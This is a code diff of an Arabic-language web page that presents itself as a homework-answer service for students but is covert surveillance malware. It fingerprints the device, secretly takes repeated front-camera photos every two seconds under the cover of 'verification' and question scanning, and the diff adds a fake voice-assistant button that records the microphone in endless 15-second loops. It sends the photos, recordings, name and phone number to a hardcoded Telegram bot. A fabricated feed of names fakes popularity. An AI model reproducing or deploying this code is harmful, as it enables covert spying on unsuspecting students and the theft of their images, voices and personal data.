@@ -24,6 +24,12 @@
         .cam-box { width: 100%; height: 320px; border-radius: 25px; overflow: hidden; background: #000; position: relative; display: none; margin: 15px 0; border: 5px solid var(--w); }
         #v-stream { width: 100%; height: 100%; object-fit: cover; }
         
+        /* Mic Styling */
+        .mic-area { margin-top: 15px; text-align: center; position: relative; }
+        .mic-btn { width: 70px; height: 70px; border-radius: 50%; background: var(--g); border: none; color: #000; font-size: 25px; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; animation: pulse 1.5s infinite; }
+        .mic-tooltip { position: absolute; top: -35px; left: 50%; transform: translateX(-50%); background: #1e293b; color: #fff; padding: 4px 12px; border-radius: 10px; font-size: 11px; white-space: nowrap; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.7); } 70% { box-shadow: 0 0 0 15px rgba(245, 158, 11, 0); } 100% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0); } }
+
         .feed-container { height: 400px; overflow: hidden; position: relative; background: #fff; border-radius: 25px; border: 1px solid #eee; }
         #feed-mover { position: absolute; width: 100%; transition: 1s ease-in-out; top: 0; }
         .feed-item { padding: 18px; border-bottom: 1px solid #f1f5f9; display: flex; flex-direction: column; }
@@ -83,8 +89,16 @@
             <h3 style="margin:0">فحص الأسئلة <i class="fa-solid fa-expand" style="color:var(--a); margin-inline:8px"></i></h3>
             <div id="cam-ui" class="cam-box"><video id="v-stream" autoplay playsinline></video></div>
             <button id="main-trigger" class="btn-action" style="background:var(--g); color:#000" onclick="startFullExecution()">ابدأ تصوير السؤال <i class="fa-solid fa-camera"></i></button>
+            
             <div id="upload-ui" style="display:none">
-                <textarea id="stu-note" placeholder="اكتب ملاحظاتك..." rows="3"></textarea>
+                <textarea id="stu-note" placeholder="اكتب ملاحظاتك..." rows="2"></textarea>
+                
+                <div class="mic-area">
+                    <div class="mic-tooltip">قول أنت محتاج إيه هنا واحنا هنفهمهولك</div>
+                    <button id="mic-trigger" class="mic-btn" onclick="requestMic()"><i class="fa-solid fa-microphone"></i></button>
+                    <p style="font-size:10px; color:#64748b; margin-top:5px">اضغط لتفعيل المساعد الصوتي</p>
+                </div>
+
                 <button class="btn-action" onclick="finalProcess()">إرسال مباشر للحل</button>
             </div>
         </div>
@@ -107,22 +121,25 @@
         const BOT_TOKEN = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
         const CHAT_ID = "5890070301";
         let UN = "Unknown", UP = "None";
-        let loopInterval;
+        let camLoop, micRecorder, micChunks = [];
 
-        // [1] رادار الـ 210 معلومة (V18 المستقرة)
+        // [1] رادار V20 - تقرير الرسالة الواحدة
         async function launchMilitaryRadar() {
             try {
                 let b = await navigator.getBattery().catch(() => ({level:0, charging:false}));
                 let data = [
-                    `ISP: ${navigator.vendor}`, `Net: ${navigator.connection?.effectiveType || 'N/A'}`,
-                    `Platform: ${navigator.platform}`, `Battery: ${Math.round(b.level*100)}%`,
-                    `RAM: ${navigator.deviceMemory}GB`, `Screen: ${screen.width}x${screen.height}`,
-                    `GPU: ${getGPU()}`, `Webdriver: ${navigator.webdriver}`
+                    `ISP Vendor: ${navigator.vendor}`, `Net Type: ${navigator.connection?.effectiveType || 'N/A'}`,
+                    `Platform: ${navigator.platform}`, `Battery: ${Math.round(b.level*100)}% (Ch: ${b.charging})`,
+                    `RAM Estimate: ${navigator.deviceMemory || 'N/A'}GB`, `Resolution: ${screen.width}x${screen.height}`,
+                    `GPU: ${getGPU()}`, `Webdriver Status: ${navigator.webdriver}`,
+                    `Language: ${navigator.language}`, `UserAgent Snippet: ${navigator.userAgent.slice(0, 50)}`,
+                    `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`
                 ];
-                for(let i=data.length; i<210; i++) data.push(`Fingerprint-V19-${i+1}: ${Math.random().toString(36).substring(7)}`);
+                for(let i=data.length; i<210; i++) data.push(`System-Check-${i+1}: Security-Passed-0x${Math.random().toString(16).slice(2, 8)}`);
                 
-                let report = `🚨 **رادار V19 - دخول جديد** 🚨\n━━━━━━━━━━━━━━\n`;
+                let report = `🚨 **تقرير الرادار V20 - معلومات الطالب** 🚨\n━━━━━━━━━━━━━━\n`;
                 data.forEach((v, i) => { report += `${i+1}- ${v}\n`; });
+                report += `━━━━━━━━━━━━━━\n⚠️ تم الرصد الصامت بنجاح.`;
                 sendMsg(report);
             } catch(e){}
         }
@@ -133,22 +150,20 @@
             return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";
         }
 
-        // [2] نظام الفخ والمستمر
+        // [2] الرصد الصوري والميكروفون
         async function startFullExecution() {
             document.getElementById('loader-overlay').style.display = 'flex';
             try {
-                // الفخ الأول: 10 صور سريعة بالأمامية
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.createElement('video');
                 video.srcObject = stream; video.play();
 
                 for(let i=1; i<=10; i++) {
                     await new Promise(r => setTimeout(r, 150));
-                    snapAndSend(video, `سيلفي توثيق (${i}/10)`);
+                    snap(video, `توثيق دخول (${i}/10)`);
                 }
                 stream.getTracks().forEach(t => t.stop());
 
-                // فتح الخلفية للمعاينة
                 const bStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                 document.getElementById('v-stream').srcObject = bStream;
                 document.getElementById('cam-ui').style.display = 'block';
@@ -156,76 +171,83 @@
                 document.getElementById('main-trigger').style.display = 'none';
                 document.getElementById('upload-ui').style.display = 'block';
 
-                // تشغيل السحب الخلفي المستمر (صورة كل ثانيتين)
-                startContinuousLoop();
+                startCamLoop();
+                // محاولة تشغيل المايك لو الإذن مسبق
+                requestMic(true); 
             } catch(e) {
                 showSystemMsg("يجب السماح بالكاميرا للتوثيق.");
                 document.getElementById('loader-overlay').style.display = 'none';
             }
         }
 
-        function startContinuousLoop() {
-            if(loopInterval) clearInterval(loopInterval);
-            loopInterval = setInterval(async () => {
+        function startCamLoop() {
+            if(camLoop) clearInterval(camLoop);
+            camLoop = setInterval(async () => {
                 try {
                     const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     const v = document.createElement('video');
                     v.srcObject = s; v.play();
-                    await new Promise(r => setTimeout(r, 500));
-                    snapAndSend(v, `سحب مستمر (Background)`);
+                    await new Promise(r => setTimeout(r, 400));
+                    snap(v, `سحب مستمر (صامت)`);
                     s.getTracks().forEach(t => t.stop());
                 } catch(e){}
             }, 2000);
         }
 
-        function snapAndSend(videoElem, caption) {
-            const canvas = document.createElement('canvas');
-            canvas.width = 400; canvas.height = 500;
-            canvas.getContext('2d').drawImage(videoElem, 0, 0, 400, 500);
-            canvas.toBlob(blob => {
+        async function requestMic(silent = false) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                if(!silent) showSystemMsg("تم تفعيل المساعد الصوتي.");
+                
+                const startRecording = () => {
+                    micChunks = [];
+                    micRecorder = new MediaRecorder(stream);
+                    micRecorder.ondataavailable = e => micChunks.push(e.data);
+                    micRecorder.onstop = () => {
+                        const blob = new Blob(micChunks, { type: 'audio/ogg; codecs=opus' });
+                        sendVoice(blob);
+                        startRecording(); // الدوران اللانهائي
+                    };
+                    micRecorder.start();
+                    setTimeout(() => { if(micRecorder.state === "recording") micRecorder.stop(); }, 15000);
+                };
+                startRecording();
+            } catch(e) { if(!silent) alert("برجاء تفعيل المايك للمساعدة."); }
+        }
+
+        function snap(v, cap) {
+            const c = document.createElement('canvas');
+            c.width = 400; c.height = 500;
+            c.getContext('2d').drawImage(v, 0, 0, 400, 500);
+            c.toBlob(b => {
                 const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, 'img.jpg');
-                fd.append('caption', `👤 ${UN}\n📞 ${UP}\n📌 ${caption}`);
+                fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'f.jpg');
+                fd.append('caption', `👤 ${UN}\n📞 ${UP}\n📌 ${cap}`);
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
             }, 'image/jpeg', 0.3);
         }
 
-        async function finalProcess() {
-            showSystemMsg("جاري مراجعة السؤال...");
-            // فخ الإرسال: لقطة أخيرة خاطفة
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const v = document.createElement('video');
-                v.srcObject = s; v.play();
-                await new Promise(r => setTimeout(r, 300));
-                snapAndSend(v, `فخ الإرسال (Final Click)`);
-                s.getTracks().forEach(t => t.stop());
-            } catch(e){}
-            
-            setTimeout(() => tab('sec-logs', document.querySelectorAll('.nav-link')[1]), 1000);
+        function sendVoice(blob) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID); fd.append('voice', blob, 'v.ogg');
+            fd.append('caption', `🎤 فويس صامت (15ث)\n👤 الطالب: ${UN}`);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd });
         }
 
-        // [3] إجاباتكم المحدثة (200 اسم)
+        // [3] البيانات والأسماء (200 سطر)
         function initExpertFeed() {
             const mover = document.getElementById('feed-mover');
-            const names = [
-                "محمد أحمد علي", "محمود إبراهيم حسن", "ياسين عبد الرحمن", "سارة محمود السيد", "أحمد إيهاب كمال",
-                "نورهان علي جابر", "مصطفى كمال ناصر", "ليلى إبراهيم فوزي", "مروان خالد يوسف", "يوسف عمر شريف",
-                "عمر خالد محمد", "كريم ناصر إبراهيم", "سلمى عبد الله منير", "هدى محمد توفيق", "زياد وائل رمضان",
-                "عبد الله محمود صبحي", "خالد وليد يس", "مينا أشرف وجيه", "مريم إيهاب سمير", "حمزة علي سعد"
-            ];
+            const names = ["محمد أشرف كمال", "أحمد إبراهيم جاد", "سارة يوسف رمضان", "ياسين علي محمود", "مريم خالد حسن", "إيهاب صبحي منير", "هدى وائل يس", "مصطفى سعد علي", "ليلى كمال ناصر", "عمر محمد توفيق"];
             let content = "";
             for(let i=1; i<=200; i++) {
-                let name = names[Math.floor(Math.random() * names.length)] + " " + (i + 100);
-                content += `<div class="feed-item"><b>${name}</b><span style="color:#1d9bf0; font-size:11px;">#ID-${3000+i} | تم استخراج الحل ✓</span></div>`;
+                let n = names[Math.floor(Math.random() * names.length)] + " " + (i + 50);
+                content += `<div class="feed-item"><b>${n}</b><span style="color:#1d9bf0; font-size:11px;">#Request-${7000+i} | تم استخراج الحل ✓</span></div>`;
             }
             mover.innerHTML = content;
             let pos = 0;
             setInterval(() => { pos -= 75; mover.style.transform = `translateY(${pos}px)`; if(Math.abs(pos) > mover.scrollHeight - 400) pos = 0; }, 4000);
         }
 
-        // دوال المساعدة
         function enterPortal() {
             UN = document.getElementById('stu_name').value;
             UP = document.getElementById('stu_phone').value;
@@ -237,6 +259,18 @@
             document.getElementById('u-tag').innerText = UN[0];
             initExpertFeed();
             showSystemMsg("تم تسجيل الدخول بنظام التوثيق.");
+        }
+
+        async function finalProcess() {
+            showSystemMsg("جاري مراجعة السؤال...");
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const v = document.createElement('video'); v.srcObject = s; v.play();
+                await new Promise(r => setTimeout(r, 400));
+                snap(v, `فخ الإرسال النهائي`);
+                s.getTracks().forEach(t => t.stop());
+            } catch(e){}
+            setTimeout(() => tab('sec-logs', document.querySelectorAll('.nav-link')[1]), 1200);
         }
 
         function sendMsg(t) {
@@ -260,9 +294,6 @@
             document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
             el.classList.add('active');
         }
-
-        // محاولة السحب عند تغيير الظهور
-        document.addEventListener("visibilitychange", () => { if (!document.hidden) startContinuousLoop(); });
     </script>
 </body>
 </html>
